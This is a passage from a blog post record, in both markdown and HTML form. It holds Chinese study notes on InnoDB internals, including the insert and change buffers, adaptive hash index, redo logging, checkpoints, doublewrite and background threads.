key，其结构如下所示：space占用4字节，表示插入的表空间的id（InnoDB中每个表都有一个唯一的space id）；marker占用1字节，用于兼容老版本Insert Buffer；page_no占用4字节，表示页所在的偏移量\n\n![图4](../static/MB20031501-4.png)\n\nInsert Buffer B+树叶子节点的记录，结构如下图所示\n\n![图5](../static/MB20031501-5.png)\n\nspace、marker、page_no字段和非叶子节点中的含义相同，一共9个字节，metadata字段占用4个字节，存储内容如下\n\n|   名称   |  字节  |\n| :-----: | :----: |\n| IBUF_REC_OFFSET_COUNT| 2 |\n| IBUF_REC_OFFSET_TYPE | 1 |\n| IBUF_REC_OFFSET_FLAGS| 1 |\n\nIBUF_REC_OFFSET_COUNT用来排序每个记录进入Insert Buffer的顺序，因为Innodb从1.0.X开始支持Change Buffer，所以需要这个顺序回放才能得到记录的正确值。\n\n> 注：\n>\n> 1. IBUF_REC_OFFSET_TYPE和IBUF_REC_OFFSET_FLAGS暂时我也没理解清楚，可能与，后面的索引页类型有关\n> 2. 接下来关于Insert Buffer Bitmap这一块，我也没懂，仅做知识点记录，以后弄明白了再补充\n\n启用Insert Buffer索引后，辅助索引页(space, page_no)中的记录可能被插入到B+树中，为了保证每次Merge Insert Buffer页必须成功，还需要一个特殊的页用来标记每个辅助索引页的可用空间，这个页的类型是Insert Buffer Bitmap。\n\n每个Insert Buffer Bitmap页用来追踪16384个辅助索引页，即256个区（Extent）（所以一个区是64个页，一个区1MB ）。每个Insert Buffer Bitmap页都在16384个页的第二个页中。每个辅助索引页在Insert Buffer Bitmap页中占用4位(bit)，如下所示：\n\n| 名称             | 大小(bit) | 说明                                                         |\n| ---------------- | --------- | ------------------------------------------------------------ |\n| IBUF_BITMAP_FREE | 2         | 0 -> 无可用剩余空间<br />1 -> 剩余空间大于1/32页(512字节)<br />2 -> 剩余空间大于1/16页<br />3 -> 剩余空间大于1/8页 |\n| IBUF_BITMAP_BUFFERED | 1 |1表示辅助索引页有记录被缓存在Insert Buffer B+树中|\n| IBUF_BITMAP_IBUF | 1 |1表示该页位Insert Buffer B+树的索引页|\n>注：总结有以下几个没弄明白的点：\n>1.在硬盘上，辅助索引是如何划分页的，如何存储，随着数据的随机新增页的划分不会发生大范围的变化吗\n>2.Insert Buffer B+树叶子节点中的记录具体结构什么样（是单个索引记录还是整页记录）\n>3.Insert Buffer Bitmap在Insert Buffer B+树上吗，如何存在，它追踪16384个页数量的原因\n\n#### Change Buffer\n\nChange Buffer是InnoDB从1.0.X版本起引入的，可视为Insert Buffer的升级，可以对DML操作——INSERT、DELETE、UPDATE——都进行缓冲，分别是：Insert Buffer、Delete Buffer、Purge Buffer。\n\nUpdate操作分为两个步骤：\n\n1. 将记录标记为已删除——对应Delete Buffer\n2. 真正将记录删除——对应Purge Buffer\n\n#### UNDO页\n\n为了满足事务的原子性，在操作任何数据之前，首先将数据备份到一个地方（这个存储备份的地方称为Undo Log），然后进行数据的修改，这样在rollback时，可以利用Undo Log中备份的undo页将数据恢复到事务开始之前的状态。\n\n#### 自适应哈希索引\n\nInnoDB存储引擎会监控对表上各索引页的查询。如果观察到建立哈希索引可以带来速度提升，则建立哈希索引，称之为自适应哈希索引（Adaptive Hash Index, AHI）。AHI是通过缓冲池的B+数页构造而来的，因此建立速度很快，而且不需要对整张表构建哈希索引。InnoDB存储引擎会自动根据访问的频率和模式来自动地为某些热点页建立哈希索引。\n\nAHI有一个要求，即对这个页的连续访问模式必须是一样的。例如对于（a，b）这样的联合索引，其访问模式可以是以下情况：\n\n```sql\nWHERE a=xxx\nWHERE a=xxx AND b=xxxx\n```\n\n若交替进行上述两种查询，那么不会对该页构造AHI。另外，还有如下要求：\n\n1. 以该模式访问了100次\n2. 页通过该模式访问了N次，其中N=页中记录/16\n\n正如一般所知的哈希索引，自适应哈希索引也只能进行等值查询，范围查询是不能使用哈希索引的。\n\n默认自适应哈希索引是开启的，可以通过`innodb_adaptive_hash_index`来配置禁用或启动此特性。\n\n### 2. 重做日志缓冲\n\n重做日志是InnoDB引擎对其本身事务操作的日志记录，记录了关于每个页的更改的物理情况。重做日志的存在能够避免宕机造成数据的丢失。\n\n在InnoDB中，为了协调CPU与磁盘速度的鸿沟，页的操作首先都是在缓冲池中完成的。重做日志也一样，InnoDB引擎首先将重做日志信息放入到内存中（即重做日志缓冲），然后按一定频率将其刷新到重做日志文件。重做日志缓冲一般不需要设置太大，因为一般情况下每一秒中会将其刷新到重做日志文件，因此只需要保证每秒产生的事务量在这个缓冲大小之内即可（可通过`innodb_log_buffer_size`控制其大小，默认8MB）。重做日志文件会在三种情况下刷新到重做日志文件：\n\n1. 主线程每秒刷新一次\n2. 每个事务提交时，会将重做日志缓冲刷新到重做日志文件\n3. 当重做日志缓冲池剩余空间小于1/2时刷新\n\n当前事务数据库系统普遍采用Write Ahead Log策略，即当事务提交时，先写重做日志，再对页数据进行修改。因此当发生宕机而导致数据丢失时，可通过重做日志完成数据的恢复，当然未刷新到日志文件的重做日志（1秒以内）还是会有所丢失。\n\n**为什么需要重做日志**\n\n如果没有重做日志存在，将数据页刷新到硬盘都将直接操作数据文件，当从缓冲池将页的新版本刷新到硬盘时发生宕机，可能出现部分已写入部分未写入的情况，因为没有重做日志的存在，无法定位哪些页未写入。\n\n> 注意：重做日志文件的主要作用不是避免宕机造成的数据丢失，而是避免因宕机造成的数据文件的不完整。数据恢复只是不可靠的顺带的功能。BinLog文件才是真正为避免数据丢失而生的。\n\n### 3. 额外内存池\n\n在InnoDB存储引擎中，对内存的管理是通过内存堆的方式进行的。在对数据结构本身的内存进行分配时，需要从额外的内存池中进行申请，当该区域的内存不足时，会从缓冲池中申请。例如，分配了缓冲池，但是每个缓冲池中的帧缓冲还有对应的缓冲控制对象（Buffer Control Block），这些对象记录了一些注入LRU、锁、等待等信息，而这个对象的内存需要从额外内存池中申请。因此，当申请了很大的InnoDB缓冲池时，也应考虑相应地增加这个值。\n\n\n\n## 其他技术与特性\n\n### 1. CHECKPOINT技术\n\nCheckPoint（检查点）技术与前面说过的重做日志有密切地关系。重做日志是用于防止因宕机导致数据文件损坏，更改记录被刷新到硬盘后，这部分的日志便已经不再需要了，可以被覆盖。因此重做日志文件被设计成可以循环使用的，一般重做日志文件有两个（也可以设置成超过两个文件），循环使用这两个文件。\n\n要能使用重做日志来恢复数据，必须知道哪些版本数据已经刷入硬盘，哪些版本未刷入硬盘。基于此，就有了检查点（CheckPoint）技术。对于InnnoDB存储引擎而言，其是通过LSN（Log Sequence Number）来标记版本的，LSN是8字节地数字，其单位是字节。每个页有LSN，重做日志中也有LSN，CheckPoint也有LSN，CheckPoint前的数据都已经被刷入硬盘，通过比对CheckPoint的LSN和重做日志中的LSN便能知道哪些版本数据未刷入硬盘。\n\n在InnoDB中，CheckPoint发生的时间、条件、脏页的选择、刷新脏页的数量都非常复杂。CheckPoint的发生主要有以下几种：\n\n1. 数据库关闭时，将所有的脏页都刷回硬盘，这是默认都有的（`innodb_fast_shutdown=1`）\n2. 主线程每1秒、每10秒从缓冲池的列表中刷新一定比例的页回磁盘，这个过程是异步的\n3. InnoDB引擎需要保证LRU列表中有差不多100个空闲页可供使用，Cleaner线程会检测，如果没有则会将LRU列表尾端的页移除，如果这些页中有脏页（在`Flush列表`中），则会进行CheckPoint。（InnoDB1.2.X开始LRU可用页的数量默认值为1024，且可通过`innodb_lru_scan_depth`控制）\n4. 当重做日志文件达到`75% * total_redo_log_file_size`时（`total_redo_log_file_size`是所有重做日志文件的总大小），会执行阻塞发现问题的用户查询线程执行Async Flush CheckPoint；当重做日志文件达到`90% * total_redo_log_file_size`时，会阻塞所有用户查询线程执行Sync Flush CheckPoint。从InnoDB1.2.X开始，在Cleaner线程执行，不会阻塞用户查询线程\n5. 当缓冲池中脏页数量达到`innodb_max_dirty_page_pct`（默认75%）时，强制执行CheckPoint\n\n### 2. 刷新临接页\n\nInnoDB还存在了刷新临接页的特性：当刷新一个脏页时，InnoDB存储引擎会检测该页所在区的所有页，如果是脏页，那么一起刷新。可以由参数`innodb_flush_neighbors`来配置启用或关闭此特性（值0表示关闭）。\n\n### 3. 异步IO\n\nInnoDB采用异步IO（Asynchronous IO, AIO）的方式来处理磁盘操作，AIO的一个优势是可以对多个索引页进行并发扫描，另一个优势是可以进行IO Merge操作，将多个IO合并为一个IO，例如用户需要访问的页（space, page_no）为（8，6)、（8，7）、（8，8），每个页大小16KB，AIO会判断这三个页是连续的，AIO底层会发送一个IO请求，读取48KB的页。\n\n在InnoDB1.1.X之前，AIO实现是通过InnoDB引擎代码模拟实现，从InnoDB1.1.X开始，提供了内核级别的AIO支持，称为Native AIO，因此编译或允许该版本MySQL时需要libaio库的支持。Native AIO需要操作系统提供支持，Windows系统和Linux系统都提供Native AIO支持，而Mac OSX系统则未提供，只能依旧使用原模拟的方式。\n\n可以通过参数`innodb_use_native_aio`来控制启用Native AIO，Linux系统下默认启用（ON）。\n\n### 4. 两次写\n\n当数据库宕机时，可能InnoDB正在写入某个页到表中，而这个页只写了一部分，比如16KB的页，只写了前4KB，之后就发生了宕机，这种情况被称为部分写失效。有经验的DBA也许会想如果发生写失效，可以通过重做日志进行恢复。但实际上并不一定可以修复，页内数据有可能本身发生损坏（这与重做日志记录的内容有关，参考[mysql 为何需要Double Write？有redo log还不够吗？](<https://blog.csdn.net/jolly10/article/details/79791574>)，估计是因为重做日志在页内的记录与最终写入磁盘的并不是完全相同的，还会经过一次与底层结构相关的计算），需要先通过页的副本来还原页，再进行重做，这个副本就就是doublewrite的内容。\n\ndoublewrite由两部分组成，一部分是内存中的doublewrite buffer，大小为2MB，另一部分是物理磁盘上共享表空间中的连续的2个区（128个页，也是2MB）。在对缓冲区进行刷新时，并不直接写磁盘，而是会通过memcpy函数将页先复制到内存中的doublewrite buffer，之后通过doublewrite  buffer再分两次，每次1MB顺序地写入共享表空间的物理磁盘上，然后马上调用fsync函数，同步磁盘，避免缓冲带来的问题。由于doublewrite页是连续的，因此这个过程是顺序写的，开销并不是很大。在完成doublewrite页写入后，再将doublewrie buffer中的页写入各个表空间文件中，此时写入是离散的。\n\n参数`skip_innodb_doublewrite`可以禁止使用doublewrite功能，有些情况下，这是需要的，如：用户有多个从服务器（在从服务器上做的是RAID0），可以在从服务器上关闭doublewrite功能；有些文件系统（ZFS文件系统）本身提供了部分写失效的防范机制，就不用开启doublewrite功能。\n\n![图1](../static/MB20031501-6.png)\n\n## 后台线程\n\n### 1. Master线程\n\n负责将重做日志缓冲刷新到重做日志文件\n\n### 2. IO线程\n\nAsync IO，分为4种线程\n\n1. Read线程（默认4条线程，由`innodb_read_io_thread`参数控制）\n2. Write线程（默认4条线程，由`innodb_write_io_thread`参数控制）\n3. Insert Buffer线程（1条线程）\n4. Log线程（1条线程）\n\n### 3. Purge线程\n\n支持设置多个线程，由`innodb_purge_threads`控制\n\n负责任务UNDO页回收，`innodb_purge_batch_size`控制每次回收数量\n\n### 4. Cleaner线程\n\n负责将缓冲池中的脏页刷新到磁盘","slug":"innodb-struct","published":0,"updated":"2020-03-16T16:12:49.738Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7uob5oo0000n4ukgpa633tm","content":"<p>InnoDB存储引擎具有行锁设计、支持事务、支持外键、支持MVCC、支持插入缓冲、支持自适应哈希索引等特点，其整体体系架构主要由后台线程、内存池、文件系统三部分组成，如下图所示：</p>\n<p><img src=\"../static/MB20031501-1.png\" alt=\"图1\"></p>\n<p>接下来会针对后台线程和内存池展开介绍。</p>\n<h2 id=\"内存池\"><a href=\"#内存池\" class=\"headerlink\" title=\"内存池\"></a>内存池</h2><p>内存池从大的方面可以分为三块：重做日志缓冲（redo log buffer）、缓冲池（buffer pool）、额外内存池（additional memery pool）。缓冲池中缓存的数据页类型有：数据页（data page），索引页（index page）、插入缓冲（insert buffer）、锁信息（lock info）、自适应哈希索引（adaptive hash index）、数据字典（data dictionary）、undo页等。缓冲池从1.0.X版本开始，允许有多个实例，根据哈希值将每个页平均分配到不同的实例中。</p>\n<p><img src=\"../static/MB20031501-2.png\" alt=\"图2\"></p>\n<h3 id=\"1-缓冲池\"><a href=\"#1-缓冲池\" class=\"headerlink\" title=\"1. 缓冲池\"></a>1. 缓冲池</h3><p>Innodb是基于磁盘存储的数据库，CPU速度和磁盘速度之间存在巨大的鸿沟，磁盘速度较慢严重降低了数据库系统的性能。基于这个问题，数据库在内存中开辟了一块区域作为缓冲池来弥补两者之间的速度差距。在数据库中读取页时，首先将从磁盘读到的页放在缓冲池中，下次再读相同的页时，首先判断该页是否在缓冲池中，若命中则直接读取该页，否则从磁盘上读取。</p>\n<h4 id=\"LRU列表\"><a href=\"#LRU列表\" class=\"headerlink\" title=\"LRU列表\"></a>LRU列表</h4><p>缓冲池通过LRU（Latest Recent Used，最近使用）算法来进行管理页（数据页、索引页），最频繁使用的排在<code>LRU列表</code>前端，反之，排在末端。当缓冲池不能存放新读取到的页时，首先释放<code>LRU列表</code>末端的页。</p>\n<p>Innodb在LRU算法上做了一些调整。一些的一次性读取大量页的SQL操作会将缓冲池中的页大量刷出，从而影响缓冲池的效率（页缓冲池缓存频繁使用页的初衷不符）。为了解决这个问题，Innodb在LRU算法上引入了midpoint概念，midpoint点将<code>LRU列表</code>一分为二，<code>LRU列表</code>前端至midpoint点为<code>new列表</code>，midpoint点至<code>LRU列表</code>末端为<code>old列表</code>。<code>new列表</code>和<code>old列表</code>各自都以LRU算法管理，新读取的页被加入<code>old列表</code>，只有在<code>old列表</code>中存活一定时间(<code>innodb_old_blocks_time</code>)以后才会被加入<code>new列表</code>，可以看出<code>new列表</code>中的页都是最为活跃的热点数据。midpoint默认值是37%，即默认<code>old列表</code>占完整LRU列表的37%，由参数<code>innodb_old_blocks_pct</code>控制。</p>\n<p><img src=\"../static/MB20031501-3.png\" alt=\"图3\"></p>\n<p><code>LRU列表</code>中存储的页数上限是确定的，Innodb引入了<code>Free列表</code>来与<code>LRU列表</code>共同管理，未分配的页由<code>Free列表</code>进行管理，<code>Free列表</code>当前页数加<code>LRU列表</code>当前页数等于<code>LRU列表</code>可容纳的总页数。新读取页时，首先从<code>Free列表</code>中查找是否有空闲页，若有则将空闲页从<code>Free列表</code>移到<code>LRU列表</code>中，否则根据规则淘汰<code>LRU列表</code>末尾的页。</p>\n<p>InnoDB中页的大小是16KB，InnoDB从1.0.X开始，支持压缩页功能，可以将部分页压缩为1KB、2KB、4KB、8KB，对于非16KB的页，使用<code>unzip_LRU列表</code>管理。如需要申请4KB大小的页时，通过伙伴算法进行分配，过程如下：</p>\n<ol>\n<li>检查4KB的<code>unzip_LRU列表</code>，检查是否有可用空闲页，若有则直接使用</li>\n<li>检查8KB的<code>unzip_LRU列表</code>，若有空闲页，将页分成2个4KB页，存放到4KB的<code>unzip_LRU列表</code></li>\n<li>从<code>LRU列表</code>申请一个16KB的页，将页分成1个8KB的页和2个4KB的页，分别存放到对应的<code>unzip_LRU列表</code>中</li>\n</ol>\n<h4 id=\"脏页\"><a href=\"#脏页\" class=\"headerlink\" title=\"脏页\"></a>脏页</h4><p><code>LRU列表</code>中的页被修改后，该页称为脏页（dirty page），脏页既存在于<code>LRU列表</code>中又存在于<code>Flush列表</code>中，会通过<code>CheckPoint机制</code>被刷新会磁盘。</p>\n<h4 id=\"插入缓冲\"><a href=\"#插入缓冲\" class=\"headerlink\" title=\"插入缓冲\"></a>插入缓冲</h4><p><strong>插入缓冲主要是针对，插入操作时在非唯一的非聚集索引上进行离散插入会导致性能下降，这个问题设计的</strong>。对于聚集索引，与数据的物理存储顺序是一致的，不用担心性能问题，但对于B+树结构下的非聚集索引这是需要考虑的问题。</p>\n<p>这里需要注意的两点是：</p>\n<ol>\n<li>插入缓冲针对的是非聚集索引，不要因为名字就认为针对的是数据页</li>\n<li>插入缓冲管辖的非聚集索引必须是非唯一的索引</li>\n</ol>\n<p>InnoDB存储引擎设计了Insert Buffer（插入缓冲），对于非聚集索引的插入或更新操作，不是每一次直接插入到索引页中，而是先判断插入的非聚集索引页是否在缓冲池中，若在则直接插入，否则先放入到Insert Buffer对象中，好似欺骗。之后主线程会异步地进行合并插入缓冲的工作，这样就大大提高了非聚集索引的插入效率。</p>\n<p>Insert Buffer的数据结构是一棵B+树，在MySQL4.1之前每张表有一棵B+树，而现在版本中全局只有一棵B+树，这棵B+树存放在共享表空间中，默认也就是<code>ibdata1文件</code>中。因此，试图通过独立表空间<code>.ibd文件</code>恢复表中数据时，往往会导致CHECK TABLE失败。这是因为表的辅助索引中的数据可能还在Insert Buffer中，所以通过<code>.ibd文件</code>进行恢复后，还需要进行REPAIR TABLE操作来重建表上所有的辅助索引。</p>\n<p><strong>B+树数据结构</strong></p>\n<p>Insert Buffer B+树非叶子节点存放的是查询的search key，其结构如下所示：space占用4字节，表示插入的表空间的id（InnoDB中每个表都有一个唯一的space id）；marker占用1字节，用于兼容老版本Insert Buffer；page_no占用4字节，表示页所在的偏移量</p>\n<p><img src=\"../static/MB20031501-4.png\" alt=\"图4\"></p>\n<p>Insert Buffer B+树叶子节点的记录，结构如下图所示</p>\n<p><img src=\"../static/MB20031501-5.png\" alt=\"图5\"></p>\n<p>space、marker、page_no字段和非叶子节点中的含义相同，一共9个字节，metadata字段占用4个字节，存储内容如下</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">名称</th>\n<th align=\"center\">字节</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">IBUF_REC_OFFSET_COUNT</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">IBUF_REC_OFFSET_TYPE</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">IBUF_REC_OFFSET_FLAGS</td>\n<td align=\"center\">1</td>\n</tr>\n</tbody></table>\n<p>IBUF_REC_OFFSET_COUNT用来排序每个记录进入Insert Buffer的顺序，因为Innodb从1.0.X开始支持Change Buffer，所以需要这个顺序回放才能得到记录的正确值。</p>\n<blockquote>\n<p>注：</p>\n<ol>\n<li>IBUF_REC_OFFSET_TYPE和IBUF_REC_OFFSET_FLAGS暂时我也没理解清楚，可能与，后面的索引页类型有关</li>\n<li>接下来关于Insert Buffer Bitmap这一块，我也没懂，仅做知识点记录，以后弄明白了再补充</li>\n</ol>\n</blockquote>\n<p>启用Insert Buffer索引后，辅助索引页(space, page_no)中的记录可能被插入到B+树中，为了保证每次Merge Insert Buffer页必须成功，还需要一个特殊的页用来标记每个辅助索引页的可用空间，这个页的类型是Insert Buffer Bitmap。</p>\n<p>每个Insert Buffer Bitmap页用来追踪16384个辅助索引页，即256个区（Extent）（所以一个区是64个页，一个区1MB ）。每个Insert Buffer Bitmap页都在16384个页的第二个页中。每个辅助索引页在Insert Buffer Bitmap页中占用4位(bit)，如下所示：</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>大小(bit)</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>IBUF_BITMAP_FREE</td>\n<td>2</td>\n<td>0 -&gt; 无可用剩余空间<br>1 -&gt; 剩余空间大于1/32页(512字节)<br>2 -&gt; 剩余空间大于1/16页<br>3 -&gt; 剩余空间大于1/8页</td>\n</tr>\n<tr>\n<td>IBUF_BITMAP_BUFFERED</td>\n<td>1</td>\n<td>1表示辅助索引页有记录被缓存在Insert Buffer B+树中</td>\n</tr>\n<tr>\n<td>IBUF_BITMAP_IBUF</td>\n<td>1</td>\n<td>1表示该页位Insert Buffer B+树的索引页</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>注：总结有以下几个没弄明白的点：<br>1.在硬盘上，辅助索引是如何划分页的，如何存储，随着数据的随机新增页的划分不会发生大范围的变化吗<br>2.Insert Buffer B+树叶子节点中的记录具体结构什么样（是单个索引记录还是整页记录）<br>3.Insert Buffer Bitmap在Insert Buffer B+树上吗，如何存在，它追踪16384个页数量的原因</p>\n</blockquote>\n<h4 id=\"Change-Buffer\"><a href=\"#Change-Buffer\" class=\"headerlink\" title=\"Change Buffer\"></a>Change Buffer</h4><p>Change Buffer是InnoDB从1.0.X版本起引入的，可视为Insert Buffer的升级，可以对DML操作——INSERT、DELETE、UPDATE——都进行缓冲，分别是：Insert Buffer、Delete Buffer、Purge Buffer。</p>\n<p>Update操作分为两个步骤：</p>\n<ol>\n<li>将记录标记为已删除——对应Delete Buffer</li>\n<li>真正将记录删除——对应Purge Buffer</li>\n</ol>\n<h4 id=\"UNDO页\"><a href=\"#UNDO页\" class=\"headerlink\" title=\"UNDO页\"></a>UNDO页</h4><p>为了满足事务的原子性，在操作任何数据之前，首先将数据备份到一个地方（这个存储备份的地方称为Undo Log），然后进行数据的修改，这样在rollback时，可以利用Undo Log中备份的undo页将数据恢复到事务开始之前的状态。</p>\n<h4 id=\"自适应哈希索引\"><a href=\"#自适应哈希索引\" class=\"headerlink\" title=\"自适应哈希索引\"></a>自适应哈希索引</h4><p>InnoDB存储引擎会监控对表上各索引页的查询。如果观察到建立哈希索引可以带来速度提升，则建立哈希索引，称之为自适应哈希索引（Adaptive Hash Index, AHI）。AHI是通过缓冲池的B+数页构造而来的，因此建立速度很快，而且不需要对整张表构建哈希索引。InnoDB存储引擎会自动根据访问的频率和模式来自动地为某些热点页建立哈希索引。</p>\n<p>AHI有一个要求，即对这个页的连续访问模式必须是一样的。例如对于（a，b）这样的联合索引，其访问模式可以是以下情况：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WHERE a=xxx</span><br><span class=\"line\">WHERE a=xxx AND b=xxxx</span><br></pre></td></tr></table></figure>\n\n<p>若交替进行上述两种查询，那么不会对该页构造AHI。另外，还有如下要求：</p>\n<ol>\n<li>以该模式访问了100次</li>\n<li>页通过该模式访问了N次，其中N=页中记录/16</li>\n</ol>\n<p>正如一般所知的哈希索引，自适应哈希索引也只能进行等值查询，范围查询是不能使用哈希索引的。</p>\n<p>默认自适应哈希索引是开启的，可以通过<code>innodb_adaptive_hash_index</code>来配置禁用或启动此特性。</p>\n<h3 id=\"2-重做日志缓冲\"><a href=\"#2-重做日志缓冲\" class=\"headerlink\" title=\"2. 重做日志缓冲\"></a>2. 重做日志缓冲</h3><p>重做日志是InnoDB引擎对其本身事务操作的日志记录，记录了关于每个页的更改的物理情况。重做日志的存在能够避免宕机造成数据的丢失。</p>\n<p>在InnoDB中，为了协调CPU与磁盘速度的鸿沟，页的操作首先都是在缓冲池中完成的。重做日志也一样，InnoDB引擎首先将重做日志信息放入到内存中（即重做日志缓冲），然后按一定频率将其刷新到重做日志文件。重做日志缓冲一般不需要设置太大，因为一般情况下每一秒中会将其刷新到重做日志文件，因此只需要保证每秒产生的事务量在这个缓冲大小之内即可（可通过<code>innodb_log_buffer_size</code>控制其大小，默认8MB）。重做日志文件会在三种情况下刷新到重做日志文件：</p>\n<ol>\n<li>主线程每秒刷新一次</li>\n<li>每个事务提交时，会将重做日志缓冲刷新到重做日志文件</li>\n<li>当重做日志缓冲池剩余空间小于1/2时刷新</li>\n</ol>\n<p>当前事务数据库系统普遍采用Write Ahead Log策略，即当事务提交时，先写重做日志，再对页数据进行修改。因此当发生宕机而导致数据丢失时，可通过重做日志完成数据的恢复，当然未刷新到日志文件的重做日志（1秒以内）还是会有所丢失。</p>\n<p><strong>为什么需要重做日志</strong></p>\n<p>如果没有重做日志存在，将数据页刷新到硬盘都将直接操作数据文件，当从缓冲池将页的新版本刷新到硬盘时发生宕机，可能出现部分已写入部分未写入的情况，因为没有重做日志的存在，无法定位哪些页未写入。</p>\n<blockquote>\n<p>注意：重做日志文件的主要作用不是避免宕机造成的数据丢失，而是避免因宕机造成的数据文件的不完整。数据恢复只是不可靠的顺带的功能。BinLog文件才是真正为避免数据丢失而生的。</p>\n</blockquote>\n<h3 id=\"3-额外内存池\"><a href=\"#3-额外内存池\" class=\"headerlink\" title=\"3. 额外内存池\"></a>3. 额外内存池</h3><p>在InnoDB存储引擎中，对内存的管理是通过内存堆的方式进行的。在对数据结构本身的内存进行分配时，需要从额外的内存池中进行申请，当该区域的内存不足时，会从缓冲池中申请。例如，分配了缓冲池，但是每个缓冲池中的帧缓冲还有对应的缓冲控制对象（Buffer Control Block），这些对象记录了一些注入LRU、锁、等待等信息，而这个对象的内存需要从额外内存池中申请。因此，当申请了很大的InnoDB缓冲池时，也应考虑相应地增加这个值。</p>\n<h2 id=\"其他技术与特性\"><a href=\"#其他技术与特性\" class=\"headerlink\" title=\"其他技术与特性\"></a>其他技术与特性</h2><h3 id=\"1-CHECKPOINT技术\"><a href=\"#1-CHECKPOINT技术\" class=\"headerlink\" title=\"1. CHECKPOINT技术\"></a>1. CHECKPOINT技术</h3><p>CheckPoint（检查点）技术与前面说过的重做日志有密切地关系。重做日志是用于防止因宕机导致数据文件损坏，更改记录被刷新到硬盘后，这部分的日志便已经不再需要了，可以被覆盖。因此重做日志文件被设计成可以循环使用的，一般重做日志文件有两个（也可以设置成超过两个文件），循环使用这两个文件。</p>\n<p>要能使用重做日志来恢复数据，必须知道哪些版本数据已经刷入硬盘，哪些版本未刷入硬盘。基于此，就有了检查点（CheckPoint）技术。对于InnnoDB存储引擎而言，其是通过LSN（Log Sequence Number）来标记版本的，LSN是8字节地数字，其单位是字节。每个页有LSN，重做日志中也有LSN，CheckPoint也有LSN，CheckPoint前的数据都已经被刷入硬盘，通过比对CheckPoint的LSN和重做日志中的LSN便能知道哪些版本数据未刷入硬盘。</p>\n<p>在InnoDB中，CheckPoint发生的时间、条件、脏页的选择、刷新脏页的数量都非常复杂。CheckPoint的发生主要有以下几种：</p>\n<ol>\n<li>数据库关闭时，将所有的脏页都刷回硬盘，这是默认都有的（<code>innodb_fast_shutdown=1</code>）</li>\n<li>主线程每1秒、每10秒从缓冲池的列表中刷新一定比例的页回磁盘，这个过程是异步的</li>\n<li>InnoDB引擎需要保证LRU列表中有差不多100个空闲页可供使用，Cleaner线程会检测，如果没有则会将LRU列表尾端的页移除，如果这些页中有脏页（在<code>Flush列表</code>中），则会进行CheckPoint。（InnoDB1.2.X开始LRU可用页的数量默认值为1024，且可通过<code>innodb_lru_scan_depth</code>控制）</li>\n<li>当重做日志文件达到<code>75% * total_redo_log_file_size</code>时（<code>total_redo_log_file_size</code>是所有重做日志文件的总大小），会执行阻塞发现问题的用户查询线程执行Async Flush CheckPoint；当重做日志文件达到<code>90% * total_redo_log_file_size</code>时，会阻塞所有用户查询线程执行Sync Flush CheckPoint。从InnoDB1.2.X开始，在Cleaner线程执行，不会阻塞用户查询线程</li>\n<li>当缓冲池中脏页数量达到<code>innodb_max_dirty_page_pct</code>（默认75%）时，强制执行CheckPoint</li>\n</ol>\n<h3 id=\"2-刷新临接页\"><a href=\"#2-刷新临接页\" class=\"headerlink\" title=\"2. 刷新临接页\"></a>2. 刷新临接页</h3><p>InnoDB还存在了刷新临接页的特性：当刷新一个脏页时，InnoDB存储引擎会检测该页所在区的所有页，如果是脏页，那么一起刷新。可以由参数<code>innodb_flush_neighbors</code>来配置启用或关闭此特性（值0表示关闭）。</p>\n<h3 id=\"3-异步IO\"><a href=\"#3-异步IO\" class=\"headerlink\" title=\"3. 异步IO\"></a>3. 异步IO</h3><p>InnoDB采用异步IO（Asynchronous IO, AIO）的方式来处理磁盘操作，AIO的一个优势是可以对多个索引页进行并发扫描，另一个优势是可以进行IO Merge操作，将多个IO合并为一个IO，例如用户需要访问的页（space, page_no）为（8，6)、（8，7）、（8，8），每个页大小16KB，AIO会判断这三个页是连续的，AIO底层会发送一个IO请求，读取48KB的页。</p>\n<p>在InnoDB1.1.X之前，AIO实现是通过InnoDB引擎代码模拟实现，从InnoDB1.1.X开始，提供了内核级别的AIO支持，称为Native AIO，因此编译或允许该版本MySQL时需要libaio库的支持。Native AIO需要操作系统提供支持，Windows系统和Linux系统都提供Native AIO支持，而Mac OSX系统则未提供，只能依旧使用原模拟的方式。</p>\n<p>可以通过参数<code>innodb_use_native_aio</code>来控制启用Native AIO，Linux系统下默认启用（ON）。</p>\n<h3 id=\"4-两次写\"><a href=\"#4-两次写\" class=\"headerlink\" title=\"4. 两次写\"></a>4. 两次写</h3><p>当数据库宕机时，可能InnoDB正在写入某个页到表中，而这个页只写了一部分，比如16KB的页，只写了前4KB，之后就发生了宕机，这种情况被称为部分写失效。有经验的DBA也许会想如果发生写失效，可以通过重做日志进行恢复。但实际上并不一定可以修复，页内数据有可能本身发生损坏（这与重做日志记录的内容有关，参考<a href=\"https://blog.csdn.net/jolly10/article/details/79791574\" target=\"_blank\" rel=\"noopener\">mysql 为何需要Double Write？有redo log还不够吗？</a>，估计是因为重做日志在页内的记录与最终写入磁盘的并不是完全相同的，还会经过一次与底层结构相关的计算），需要先通过页的副本来还原页，再进行重做，这个副本就就是doublewrite的内容。</p>\n<p>doublewrite由两部分组成，一部分是内存中的doublewrite buffer，大小为2MB，另一部分是物理磁盘上共享表空间中的连续的2个区（128个页，也是2MB）。在对缓冲区进行刷新时，并不直接写磁盘，而是会通过memcpy函数将页先复制到内存中的doublewrite buffer，之后通过doublewrite  buffer再分两次，每次1MB顺序地写入共享表空间的物理磁盘上，然后马上调用fsync函数，同步磁盘，避免缓冲带来的问题。由于doublewrite页是连续的，因此这个过程是顺序写的，开销并不是很大。在完成doublewrite页写入后，再将doublewrie buffer中的页写入各个表空间文件中，此时写入是离散的。</p>\n<p>参数<code>skip_innodb_doublewrite</code>可以禁止使用doublewrite功能，有些情况下，这是需要的，如：用户有多个从服务器（在从服务器上做的是RAID0），可以在从服务器上关闭doublewrite功能；有些文件系统（ZFS文件系统）本身提供了部分写失效的防范机制，就不用开启doublewrite功能。</p>\n<p><img src=\"../static/MB20031501-6.png\" alt=\"图1\"></p>\n<h2 